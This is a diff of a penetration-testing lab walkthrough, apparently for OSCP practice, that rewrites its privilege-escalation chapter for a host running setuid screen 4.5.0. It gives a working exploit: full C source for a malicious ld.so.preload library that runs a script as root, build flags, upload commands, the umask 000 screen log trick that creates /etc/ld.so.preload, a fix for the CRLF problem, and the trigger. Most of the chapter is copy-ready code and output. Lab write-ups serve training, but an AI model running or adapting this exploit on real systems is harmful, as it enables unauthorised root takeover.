@@ -334,7 +334,7 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
 <a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">Aerospike</span><span class="step-desc"><code>build=5.1.0.1</code>, no auth</span></a>
 <a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">UDF</span><span class="step-desc"><code>io.popen</code> → <code>aero</code>, pty on <code>:3000</code></span></a>
 <a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">Enum</span><span class="step-desc">PwnKit out, <code>screen-4.5.0</code> in</span></a>
-<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">screen</span><span class="step-desc"><code>ld.so.preload</code> via <code>umask 000</code></span></a>
+<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">screen</span><span class="step-desc"><code>libhax.so</code> → <code>ld.so.preload</code> → root</span></a>
 <a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">proof.txt</span><span class="step-desc">root, then cleanup</span></a></div>
       <div class="flags">
         <div class="flag">
@@ -1211,7 +1211,7 @@ compiler on the far side to fix it.</p>
 </table>
 <p>One setuid binary on a five-year-old release, installed by hand, in a box whose package database
 claims <code>screen 4.8.0</code>. That contradiction is the finding.</p></div></section>
-<section class="chapter" id="ch-06" data-title="Privilege escalation"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Privilege escalation</h2><p class="ch-sub">setuid screen 4.5.0, CRLF and the rewrite</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>One setuid binary, one old release, one file it creates as root. This chapter is the whole box.</p>
+<section class="chapter" id="ch-06" data-title="Privilege escalation"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Privilege escalation</h2><p class="ch-sub">Payload: get, modify, build, deliver, trigger — by machine</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>One setuid binary, one old release, one file it creates as root. This chapter is the whole box.</p>
 <hr />
 <h3>6.1 The contradiction</h3>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/usr/bin/screen -&gt; screen-4.5.0
@@ -1248,124 +1248,291 @@ into every process" file. If we can write there, the next setuid-root binary tha
 shared object <strong>as root</strong>, before <code>main()</code> runs.</p>
 <p><code>screen 4.5.1</code> fixed it by refusing to use a setuid configuration and by opening the log with
 <code>O_NOFOLLOW|O_EXCL</code>.</p>
+<p>The rest of this chapter is the payload's life cycle: where it comes from, what has to be changed in
+it, how it gets onto a host that has no compiler, and how it is run. Commands are labelled with the
+machine they belong on, because <strong>none of them work on the other one</strong>.</p>
 <hr />
-<h3>6.3 The payload</h3>
-<p>Two files. A preload library, and the script it runs:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cm">/* libhax.c — constructor runs before main(), in the loader, as euid 0 */</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<h3>6.3 Getting the payload (on Kali)</h3>
+<p>The public exploit is Exploit-DB <strong>41154</strong> (<code>screen 4.5.0 - Local Privilege Escalation</code>). It ships a
+<code>libhax.c</code>, a <code>rootsh</code> script and a <code>41154.sh</code> that compiles, uploads and triggers. Copy it out of
+<code>searchsploit</code> once and treat the two payload files as source you own — not as a black box:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>searchsploit<span class="w"> </span>-m<span class="w"> </span>linux/local/41154.sh
+ls<span class="w"> </span>-la
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">41154.sh
+libhax.c        # extracted by the script, or copy from exploit-db
+rootsh</span></pre></div>
+<p>Everything below is in this repo's <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/files"><code>files/</code></a> directory, already built and verified:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/files/libhax.c"><code>files/libhax.c</code></a></td>
+<td>preload library source — runs in <code>ld.so</code>, as root</td>
+</tr>
+<tr>
+<td><a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/files/libhax.so"><code>files/libhax.so</code></a></td>
+<td>the compiled, stripped artifact that is delivered (<code>14 208</code> bytes, <code>sha256 4b5b1342…e19733</code>)</td>
+</tr>
+<tr>
+<td><a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/files/rootcmd.sh"><code>files/rootcmd.sh</code></a></td>
+<td>what root should do; executed by the library, output to a file</td>
+</tr>
+</tbody>
+</table>
+<p>Keeping the <code>.so</code> <strong>in the repo</strong> matters: the toolchain on the attacking box is not the toolchain
+that produced yesterday's artefact, and a rebuilt <code>.so</code> must be hash-matched to what was tested.</p>
+<hr />
+<h3>6.4 Modifying it (on Kali)</h3>
+<p>The upstream <code>libhax.c</code> is close, but three things in it decide whether you get root or a convincing
+nothing. All three are edits you make <strong>before</strong> compiling.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">#define STAGE  &quot;/tmp/screenroot&quot;</span>
+<span class="cp">#define LOCK   STAGE &quot;/.lock&quot;</span>
+<span class="cp">#define SCRIPT STAGE &quot;/rootcmd.sh&quot;</span>
+<span class="cp">#define OUT    STAGE &quot;/rootout.txt&quot;</span>
 
 <span class="n">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
-<span class="kt">void</span><span class="w"> </span><span class="n">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">geteuid</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">          </span><span class="cm">/* every process loads it; only act as root */</span>
+<span class="kt">void</span><span class="w"> </span><span class="n">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">geteuid</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">                 </span><span class="cm">/* every process loads it; only act as root */</span>
 <span class="w">        </span><span class="k">return</span><span class="p">;</span>
 
-<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/tmp/screenroot/.lock&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_CREAT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_EXCL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_WRONLY</span><span class="p">,</span><span class="w"> </span><span class="mo">0600</span><span class="p">);</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">                  </span><span class="cm">/* single-shot: never run twice */</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">LOCK</span><span class="p">,</span><span class="w"> </span><span class="n">O_CREAT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_EXCL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_WRONLY</span><span class="p">,</span><span class="w"> </span><span class="mo">0600</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">                         </span><span class="cm">/* single-shot: never run twice */</span>
 <span class="w">        </span><span class="k">return</span><span class="p">;</span>
 <span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-<span class="w">    </span><span class="n">unlink</span><span class="p">(</span><span class="s">&quot;/etc/ld.so.preload&quot;</span><span class="p">);</span><span class="w">  </span><span class="cm">/* remove ourselves before spawning children */</span>
-<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh /tmp/screenroot/rootcmd.sh &gt; /tmp/screenroot/rootout.txt 2&gt;&amp;1&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="n">chmod</span><span class="p">(</span><span class="s">&quot;/tmp/screenroot/rootout.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="mo">0666</span><span class="p">);</span>
+<span class="w">    </span><span class="n">unlink</span><span class="p">(</span><span class="s">&quot;/etc/ld.so.preload&quot;</span><span class="p">);</span><span class="w">        </span><span class="cm">/* remove ourselves before spawning children */</span>
+
+<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh &quot;</span><span class="w"> </span><span class="n">SCRIPT</span><span class="w"> </span><span class="s">&quot; &gt; &quot;</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="s">&quot; 2&gt;&amp;1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">chmod</span><span class="p">(</span><span class="n">OUT</span><span class="p">,</span><span class="w"> </span><span class="mo">0666</span><span class="p">);</span>
 <span class="p">}</span>
 </pre></div>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## rootcmd.sh — what root should do for us</span>
-id
-hostname
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;--- proof.txt ---&quot;</span>
-cat<span class="w"> </span>/root/proof.txt
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;--- artifacts ---&quot;</span>
-cp<span class="w"> </span>/bin/bash<span class="w"> </span>/tmp/screenroot/rbash
-chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>/tmp/screenroot/rbash
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/screenroot
-</pre></div>
-<p>Three details in that C are deliberate and each one is load-bearing:</p>
+<p><strong>Edit 1 — the three paths.</strong> <code>STAGE</code> is where the library looks for its script and writes its
+output. It must be a directory the unprivileged user can create and write, because the <em>attacker</em>
+populates it; the constructor only reads from it as root. <code>/tmp/...</code> is the usual choice. This is the
+one block to change when retargeting (§6.11).</p>
+<p><strong>Edit 2 — <code>setgid(0); setuid(0);</code> before <code>system()</code>.</strong> This is the line the published payload usually
+leaves out, and without it the exploit <em>appears</em> to work. A setuid process starts with <code>uid=1000</code>,
+<code>euid=0</code>. dash and bash both check <code>uid != euid</code> at startup and voluntarily drop the effective uid
+unless invoked with <code>-p</code>. So <code>system()</code> succeeds, the constructor's own calls run as root, and the
+shell it spawns does not:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=1000(aero) gid=1000(aero) groups=1000(aero)
+--- proof.txt ---
+cat: /root/proof.txt: Permission denied
+--- artifacts ---
+-rwsr-xr-x 1 aero aero 1183448 /tmp/screenroot/rbash</span></pre></div>
+<p>That is a <code>chmod 4755</code> copy of bash <strong>owned by <code>aero</code></strong> — setuid, plausible-looking, and worth
+nothing. Normalising the real uid and gid to 0 first means the child has no reason to drop:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=0(root) gid=0(root) groups=0(root)</span></pre></div>
+<p><strong>Edit 3 — keep the guard, the lock and the unlink.</strong> Each is load-bearing:</p>
 <ul>
 <li><strong><code>geteuid() != 0</code> guard.</strong> <code>/etc/ld.so.preload</code> is read by <em>every</em> dynamic binary, including the
   ones our own shell spawns. Without the guard the constructor would recurse into every command.</li>
-<li><strong><code>.lock</code> with <code>O_EXCL</code>.</strong> Even with the guard, several setuid processes may start within the same
-  second. <code>O_CREAT|O_EXCL</code> makes exactly one of them win.</li>
+<li><strong><code>.lock</code> with <code>O_CREAT|O_EXCL</code>.</strong> Several setuid processes may start within the same second.
+  <code>O_EXCL</code> makes exactly one of them win — which also matters on a retry: while <code>.lock</code> exists the
+  payload refuses to run again, so a second attempt silently does nothing until it is deleted.</li>
 <li><strong><code>unlink("/etc/ld.so.preload")</code> before <code>system()</code>.</strong> The child shell is a dynamic binary; if the
-  preload file is still there, <em>it</em> loads the library too, and now <code>system()</code> is running inside a
-  process that already ran <code>system()</code>. Removing the file first makes the export single-use and keeps
-  the tree finite.</li>
+  preload file is still there, <em>it</em> loads the library too, and <code>system()</code> runs inside a process that
+  already ran <code>system()</code>. Removing the file first makes the export single-use and keeps the tree
+  finite.</li>
 </ul>
-<p>Build it against the oldest ABI that will run (chapter 05, §5.4):</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>gcc<span class="w"> </span>-Os<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>libhax.so<span class="w"> </span>libhax.c
-strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
-objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;GLIBC_[0-9.]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV<span class="w">   </span>#<span class="w"> </span>-&gt;<span class="w"> </span>GLIBC_2.2.5
-</pre></div>
-<p>No compiler on the target and no way to fetch one: push both files through the Aerospike socket
-(chapter 04, §4.6), verifying the hash on the far side. A reverse shell (§4.5) gives you a terminal,
-but a terminal is a poor transport for a 14 KB shared object.</p>
 <hr />
-<h3>6.4 Writing the preload file — and the CRLF trap</h3>
+<h3>6.5 Building it (on Kali)</h3>
+<p>Build against the <strong>oldest ABI that will run</strong>, not against your own glibc (chapter 05, §5.4). One
+<code>objdump</code> line checks it:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>gcc<span class="w"> </span>-Os<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-fno-asynchronous-unwind-tables<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-o<span class="w"> </span>libhax.so<span class="w"> </span>libhax.c
+strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
+objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;GLIBC_[0-9.]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">GLIBC_2.2.5</span></pre></div>
+<p>A second version string in that list — <code>GLIBC_2.34</code>, <code>GLIBC_2.38</code> — means the library was built
+against a newer glibc than the target has, and the loader will refuse it at trigger time. Rebuild in
+an older container rather than hoping.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-l<span class="w"> </span>libhax.so<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sha256sum<span class="w"> </span>libhax.so
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rwxrwxr-x 1 kali kali 14208 libhax.so
+4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733  libhax.so</span></pre></div>
+<p>That hash is what the upload step compares against.</p>
+<hr />
+<h3>6.6 Delivering it (on Kali → on target)</h3>
+<p>The target has no compiler and no route to one: egress is a port allowlist (chapter 04, §4.4), so no
+<code>apt</code>, no <code>wget</code>, no <code>git clone</code>. A terminal over the reverse shell is a bad pipe for a 14 KB shared
+object. The file travels over the <strong>Aerospike socket</strong> that gave code execution, chunked and
+hash-verified (chapter 04, §4.6).</p>
+<p><strong>On Kali</strong> — send both files, into the stage directory the payload expects:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.150.143<span class="w"> </span>python3<span class="w"> </span>scripts/poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--local<span class="w"> </span>files/libhax.so<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/libhax.so<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
+
+<span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.150.143<span class="w"> </span>python3<span class="w"> </span>scripts/poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--local<span class="w"> </span>files/rootcmd.sh<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/rootcmd.sh<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] uploading files/libhax.so (14208 bytes) -&gt; /tmp/screenroot/libhax.so
+[+] local sha256 4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733
+    sent 18944 b64 chars
+[+] remote: 4b5b134289a961d498c3640ca7e3ad4a780606364005a9ed7c94e82295e19733  /tmp/screenroot/libhax.so
+[+] hash match — the file arrived intact</span></pre></div>
+<p><strong>On target</strong> — the result, and the one thing to check before going further:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/tmp/screenroot
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rwxr-xr-x 1 aero aero 14208 libhax.so
+-rwxr-xr-x 1 aero aero   494 rootcmd.sh</span></pre></div>
+<p>Check the <strong>size</strong> and the hash, not just the name. A truncated upload is a valid ELF header followed
+by garbage, and the loader's complaint (<code>invalid ELF header</code> / <code>cannot open shared object file</code>) is
+swallowed by <code>io.popen</code> unless you append <code>2&gt;&amp;1</code>.</p>
+<blockquote>
+<p>A host that has been half-exploited already (see §6.7) prefixes the output of <strong>every</strong> command with
+<code>ERROR: ld.so: object … ignored.</code> Those lines land in front of <code>sha256sum</code> output, so the digest has
+to be matched by pattern, never by position — the uploader does this and still reports
+<code>hash mismatch</code> on the first version that did not.</p>
+</blockquote>
+<hr />
+<h3>6.7 Creating the root-owned preload file (on target)</h3>
+<p>This is the actual exploit, and it is worth understanding <strong>who is allowed to do what</strong>, because it
+determines what you can re-run:</p>
+<table>
+<thead>
+<tr>
+<th>Actor</th>
+<th>Create <code>/etc/ld.so.preload</code></th>
+<th>Write to it if it exists and is <code>0666</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>aero</code></td>
+<td><strong>no</strong> — <code>/etc</code> is root-owned <code>0755</code>, <code>printf &gt; …</code> returns <code>rc=2</code></td>
+<td><strong>yes</strong></td>
+</tr>
+<tr>
+<td>setuid <code>screen</code></td>
+<td><strong>yes</strong> — as root, with the mode from <code>umask</code></td>
+<td>yes</td>
+</tr>
+</tbody>
+</table>
+<p>So the file must be created <strong>by screen</strong> every time. Running as <code>aero</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;/tmp/screenroot/libhax.so\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">rc=2</span></pre></div>
+<p><code>rc=2</code> with no file is not a permissions accident to work around — it is the proof that this step is
+the vulnerability. The creation has to come from the setuid binary:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>/etc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">umask</span><span class="w"> </span><span class="m">000</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
 screen<span class="w"> </span>-D<span class="w"> </span>-m<span class="w"> </span>-L<span class="w"> </span>ld.so.preload<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;printf &quot;\n/tmp/screenroot/libhax.so\n&quot;&#39;</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
-</pre></div>
-<p>The file exists, and it is exactly what we wanted:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>stat<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;%A %U:%G %s %n&quot;</span><span class="w"> </span>/etc/ld.so.preload
+stat<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;%A %U:%G %s %n&quot;</span><span class="w"> </span>/etc/ld.so.preload
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rw-rw-rw- root:aero 29 /etc/ld.so.preload</span></pre></div>
-<p>Root-owned, <strong>world-writable</strong>, 29 bytes. <code>umask 000</code> did its job.</p>
-<p>But it does not work:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/etc/ld.so.preload
-</pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></pre></div>
-<p>Look at what the loader is being asked to open: <code>/tmp/screenroot/libhax.so\r</code>.</p>
-<p><strong>screen's logger writes CRLF.</strong> It is a terminal multiplexer — its log is a transcript of a
-terminal, and terminals end lines with <code>\r\n</code>. The file we wrote with <code>printf "\n…\n"</code> was recorded
-as <code>\r\n…\r\n</code>, and <code>ld.so</code> treats the trailing carriage return as part of the filename. There is no
-such file, so every preload is ignored — and, crucially, <strong>silently</strong>: <code>ld.so</code> warns and continues.
-The box looks like it worked.</p>
-<p>Check bytes, not text:</p>
+<p>Root-owned, <strong>world-writable</strong>, 29 bytes. <code>umask 000</code> did its job. Note what just happened: a
+transient <code>screen</code> session whose <em>log file</em> is an arbitrary path we chose, created as root.</p>
+<hr />
+<h3>6.8 Rewriting it clean — and the CRLF trap (on target)</h3>
+<p>The file exists. It does not work:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>-A<span class="w"> </span>/etc/ld.so.preload
 </pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/tmp/screenroot/libhax.so$</span></pre></div>
-<p><code>$</code> marks end-of-line with no <code>^M</code> before it — this is the <em>cleaned</em> version, shown below.</p>
-<p>There are two ways out:</p>
-<ul>
-<li><code>dos2unix</code> / <code>tr -d '\r'</code> the file — but as <code>aero</code> we have no write permission on a <code>0644</code>
-  root-owned file.</li>
-<li><strong>Rewrite it entirely</strong> — which we can do, because <code>umask 000</code> made it <code>0666</code>:</li>
-</ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;/tmp/screenroot/libhax.so\n&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
-cat<span class="w"> </span>-A<span class="w"> </span>/etc/ld.so.preload
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">^M$
+/tmp/screenroot/libhax.so^M$</span></pre></div>
+<p><code>screen</code>'s logger writes <strong>CRLF</strong>. It is a terminal multiplexer — its log is a transcript of a
+terminal, and terminals end lines with <code>\r\n</code>. <code>ld.so</code> treats the trailing carriage return as part of
+the filename, so it tries to open <code>/tmp/screenroot/libhax.so\r</code>, which does not exist, and <strong>silently
+continues</strong>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></pre></div>
+<p>The box looks like it worked. Check bytes, not text — <code>cat -A</code> shows <code>^M$</code> for a CRLF line and <code>$</code> for
+a clean one.</p>
+<p>The file is <code>0666</code>, so <code>aero</code> can rewrite it without any privilege at all. This is the step everyone
+skips: <strong>the creation primitive gave us root ownership; the <code>0666</code> mode is what gives us a correcting
+write.</strong></p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;/tmp/screenroot/libhax.so\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>-A<span class="w"> </span>/etc/ld.so.preload
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/tmp/screenroot/libhax.so$</span></pre></div>
-<p>One clean LF-terminated path. That server-side rewrite is the step everyone skips: the <em>creation</em>
-primitive gave us root ownership, but the <code>0666</code> mode is what gave us a <em>correcting</em> write. Without
-it the CRLF would have been a hard wall.</p>
+<p>One clean LF-terminated path, no <code>^M</code>. Only now is the preload file usable.</p>
+<blockquote>
+<p><strong>A leftover preload is a fingerprint.</strong> This rebuild arrived with
+<code>-rw-rw-rw- root:aero 16 /etc/ld.so.preload</code> containing <code>^M$</code> then <code>/tmp/libhax.so</code>, and no such
+file on disk — an earlier attempt that created the file, never cleaned the CRLF, and never
+delivered the library. Every dynamic binary on the host was printing two <code>ld.so</code> errors. That is
+what a half-finished CVE-2017-5618 looks like from the outside, and it is also a reminder to remove
+the file (§7.2): a preload pointing at a deleted library degrades every command on the box.</p>
+</blockquote>
 <hr />
-<h3>6.5 Trigger</h3>
+<h3>6.9 Triggering it (on target)</h3>
 <p><code>/etc/ld.so.preload</code> is only read when a dynamic binary starts. Any setuid-root binary will do, and
 the convenient one is the same program we abused to create the file:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>screen<span class="w"> </span>-ls<span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </pre></div>
 <p>That is a setuid-root <code>screen</code>. The loader reads the preload file, maps <code>libhax.so</code>, runs the
-constructor as <code>euid 0</code>, the constructor deletes the preload file and executes <code>rootcmd.sh</code> as root.</p>
+constructor as <code>euid 0</code>, the constructor takes the lock, deletes the preload file, normalises
+credentials and executes <code>rootcmd.sh</code> as root.</p>
 <p>Two seconds later:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/etc/ld.so.preload
-cat<span class="w"> </span>/tmp/screenroot/rootout.txt
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/etc/ld.so.preload<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/screenroot/rootout.txt
 </pre></div>
